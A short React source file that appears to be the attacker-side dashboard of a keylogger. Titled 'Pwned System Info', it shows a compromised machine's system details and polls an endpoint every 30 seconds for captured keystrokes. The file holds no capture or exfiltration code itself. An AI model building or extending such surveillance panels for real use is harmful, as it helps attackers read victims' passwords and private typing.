import React, {useState, useEffect} from 'react'
import "./App.css"


function FetchKeys(){
  const [data, setData] = useState([{}])

  useEffect(() => {
    const fetchData = () => {fetch("/view_keys").then(
      res => res.json()
    ).then(
      data => {
        setData(data)
      }
    )}

    fetchData();

    // Set up an interval to fetch data every 30 seconds
    const intervalId = setInterval(fetchData, 30000);

    // Cleanup the interval on component unmount
    return () => clearInterval(intervalId);

  }, [])

  let keys = data.join("")

  return (
    <>
      <div>
        <h2>Keys:</h2>
        <div className='progress'></div>
      </div>
      <p>{keys}</p>
    </>
  )

}


export default function App(){

    const [data, setData] = useState([])

    useEffect(() => {
      fetch("/view_sys_info").then(
        res => res.json()
      ).then(
        data => {
          setData(data)
        }
      ).catch(error => {
        console.error('Error fetching data:', error);
      })
    }, [])

    let sys_info = data.length > 0 ? data.map((element, index) => {
      return <li key={index}>{element}</li>
    }) : null
  
    return(
      <>
        <h1>Pwned System Info</h1>
        <ul>{sys_info}</ul>
        <FetchKeys />
      </>
    ) 

}